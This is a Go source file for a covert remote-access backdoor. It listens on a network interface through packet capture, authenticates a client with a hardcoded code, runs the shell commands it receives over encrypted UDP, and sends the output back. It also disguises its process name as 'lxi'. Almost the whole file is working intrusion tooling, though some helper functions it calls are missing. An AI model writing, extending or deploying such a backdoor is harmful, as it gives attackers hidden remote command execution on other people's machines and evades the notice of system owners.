package main

import(
	"os"
	"os/exec"
	"reflect"
	"unsafe"
	"flag"
	"fmt"
	"strings"
	"strconv"
	"io"
	"bufio"
	"log"
	"github.com/google/gopacket/layers"
	"golang.org/x/crypto/ssh/terminal"
	"github.com/google/gopacket/pcap"
	"github.com/google/gopacket"
	"net"
)

const passwd = "D";
var authenticatedAddr string;

func main(){

	SetProcessName("lxi");

	//flags
	modePtr := flag.String("mode", "client", "The mode of the application, may either be" +
		" client or server. Defaults to client.");
	ipPtr := flag.String("ip", "127.0.0.1", "The ip to connect to if in client mode.");
	portPtr := flag.Int("port", 3322, "The port to connect to in client mode, or to listen on in server mode. Defaults to 3322.");
	interfacePtr := flag.String("iface", "eth0", "The interface for the backdoor to monitor for incoming connection, defaults to eth0.");
	lPortPtr := flag.Int("lport", 3321, "The port for the client to listen on.");

	flag.Parse();

	intiateTools();
	
	switch *modePtr {
	case "client":
		fmt.Printf("Running in client mode. Connecting to %s at port %d.\n", *ipPtr, *portPtr);
		intiateClient(*ipPtr, *portPtr, *lPortPtr);
		break;
	case "server":
		fmt.Printf("Running in server mode. Listening on %s at port %d\n", GetLocalIP(), *portPtr);
		intiateServer(*interfacePtr, *portPtr, *lPortPtr);
	}
}

func intiateClient(ip string, port, lport int){
	
	for {
		fmt.Print("Please input the authentication code: ");
		authcode, _ := terminal.ReadPassword(0);
		authstr := string(authcode);

		if authstr == passwd {
			sendEncryptedData(port, authstr, ip);
			break;
		}
		fmt.Print("\nInvalid authentication code, try again.\n");
	}

	fmt.Printf("Authentication accepted, you may now send commands.\n");

	serverAddr,err := net.ResolveUDPAddr("udp", ":" + strconv.Itoa(lport));
	checkError(err);

	serverConn, err := net.ListenUDP("udp", serverAddr);
	checkError(err);
	
	defer serverConn.Close()

	for {
		reader := bufio.NewReader(os.Stdin);
		input, _ := reader.ReadString('\n');
		input = strings.TrimSpace(input);
		
		sendEncryptedData(port, "[EXEC]" + input, ip);
		grabOutput(serverConn);
	}
}

func grabOutput(serverConn *net.UDPConn) {
	
	buf := make([]byte, 1024)
	for {
		n,_,err := serverConn.ReadFromUDP(buf)
		if err != nil {
			fmt.Println("Error: ", err)
		}

		data := decrypt_data(buf[0:n]);

		if strings.HasSuffix(data, "[END]"){
			fmt.Printf("%s", data[0:(n-5)]);
			break;
		}
		fmt.Printf("%s", data);
	}
}


func intiateServer(iface string, port, lport int){

	if handle, err := pcap.OpenLive(iface, 1600, true, pcap.BlockForever); err != nil {
		panic(err);
	} else if err := handle.SetBPFFilter("udp"); err != nil {  
		panic(err);
	} else {
		packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
		for {
			packet, err := packetSource.NextPacket() 
			if err == io.EOF {
				break
			} else if err != nil {
				log.Println("Error:", err)
				continue;
			}
			if udpLayer := packet.Layer(layers.LayerTypeUDP); udpLayer != nil {
				if ipLayer := packet.Layer(layers.LayerTypeIPv4); ipLayer != nil {
					handlePacket(ipLayer.(*layers.IPv4), udpLayer.(*layers.UDP), port, lport);
				}
			}
		}
	}
}

func handlePacket(ipLayer *layers.IPv4, udpLayer *layers.UDP, port, lport int){
	
	if authenticatedAddr == ipLayer.SrcIP.String() {
		data := decrypt_data([]byte(udpLayer.Payload));
		if strings.HasPrefix(data, "[EXEC]") {
			executeCommand(data, ipLayer.SrcIP.String(), port);
		}

	}else if lport == int(udpLayer.DstPort) {
		data := decrypt_data([]byte(udpLayer.Payload));
		if data == passwd {
			fmt.Printf("Authcode recieved, opening communication with %s\n", ipLayer.SrcIP);
			authenticatedAddr = ipLayer.SrcIP.String();
		}
	}
}
/*

FUNCTION: executeCommand(string, string, int)


*/

func executeCommand(cmd, ip string, port int){
	
	fmt.Printf("%s\n", cmd);

	tempstr := strings.SplitAfterN(cmd, "[EXEC]", 2);
	args := strings.Split(tempstr[1], " ");
	
	out, _ := exec.Command(args[0], args[1:]...).CombinedOutput();
	
	fmt.Printf("OUT:\n%s", out);

	sendEncryptedData(port, string(out[:]) + "[END]", ip);
}

func sendEncryptedData(port int, data, ip string) {
	conn, err := net.ListenUDP("udp", &net.UDPAddr{IP: net.IPv4zero, Port: 0})
	checkError(err);
	
	cryptdata := encrypt_data(data);
	_, err = conn.WriteToUDP([]byte(cryptdata), &net.UDPAddr{IP: net.ParseIP(ip), Port: port})
	checkError(err);
}

///Utility Functions

func checkError(err error){
	if err != nil {
		panic(err)
	}
}

func SetProcessName(name string) error {
    argv0str := (*reflect.StringHeader)(unsafe.Pointer(&os.Args[0]));
    argv0 := (*[1 << 30]byte)(unsafe.Pointer(argv0str.Data))[:argv0str.Len];

    n := copy(argv0, name);
    if n < len(argv0) {
            argv0[n] = 0
    }

    return nil
}


func GetLocalIP() string {
    addrs, err := net.InterfaceAddrs();
	checkError(err);
	
    for _, address := range addrs {
        if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
            if ipnet.IP.To4() != nil {
                return ipnet.IP.String();
            }
        }
    }
	
    return "";
}
